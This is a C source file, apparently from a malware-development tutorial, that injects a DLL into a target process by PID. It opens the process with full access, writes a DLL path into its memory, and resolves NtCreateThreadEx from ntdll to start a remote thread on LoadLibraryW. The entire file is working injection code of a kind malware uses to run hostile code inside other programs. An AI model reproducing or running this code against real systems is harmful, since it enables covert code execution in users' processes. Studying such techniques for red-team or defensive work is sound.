/*------------------------------------------------------------------------------------------------------
@author     crow
@brief      inject a DLL into a target process using a Win32 API + one NTAPI function (ntcreatethreadex)
@site       https://www.crow.rip/crows-nest/mal/dev/inject/ntapi-injection		     
------------------------------------------------------------------------------------------------------*/

#include "glassBox.h"

HMODULE getMod(LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

int main(int argc, char* argv[]) {

    DWORD             PID               = 0;
    HANDLE            hProcess          = NULL;
    HANDLE            hThread           = NULL;
    HMODULE           hKernel32         = NULL;
    HMODULE           hNTDLL            = NULL;
    PVOID             rBuffer           = NULL;

    wchar_t           dllPath[MAX_PATH] = L"C:\\path\\to\\crow.dll";
    size_t            pathSize          = sizeof(dllPath);
    size_t            bytesWritten      = 0;

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    info("trying to get a handle to the process (%ld)", PID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        warn("failed to get a handle to the process. error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
    
    info("getting handle to Kernel32 and NTDLL");
    hNTDLL = getMod(L"ntdll.dll");
    hKernel32 = getMod(L"kernel32.dll");
    if (hNTDLL == NULL || hKernel32 == NULL) {
        warn("module(s) == NULL. error: 0x%lx", GetLastError());
        goto CLEANUP;
    }

    pNtCreateThreadEx kawCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    okay("got the address of NtCreateThreadEx from NTDLL");
    info("\\___[ kawCreateThread\n\t\\_0x%p]\n", kawCreateThreadEx);
    PTHREAD_START_ROUTINE kawLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    okay("got the address of LoadLibrary from KERNEL32");
    info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", kawLoadLibrary);

    rBuffer = VirtualAllocEx(hProcess, rBuffer, pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (rBuffer == NULL) {
        warn("failed to allocate memory in the target process. error: 0x%lx", GetLastError());
        goto CLEANUP;
    }
    okay("allocated memory in target process");

    WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
    okay("wrote %zu-bytes to the allocated buffer", bytesWritten);

    NTSTATUS status = kawCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, kawLoadLibrary, rBuffer, FALSE, NULL, NULL, NULL, NULL);
    if (status != STATUS_SUCCESS) {
        warn("failed to create thread, error: 0x%lx", status);
        goto CLEANUP;
    }
    okay("created thread, waiting for it to finish");

    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished execution.");
    info("cleaning up now");
    goto CLEANUP;

CLEANUP:

    if (hThread) {
        info("closing handle to thread");
        CloseHandle(hThread);
    }
    if (hProcess) {
        info("closing handle to process");
        CloseHandle(hProcess);
    }

    okay("finished with the cleanup, exiting now.");
    return EXIT_SUCCESS;

}
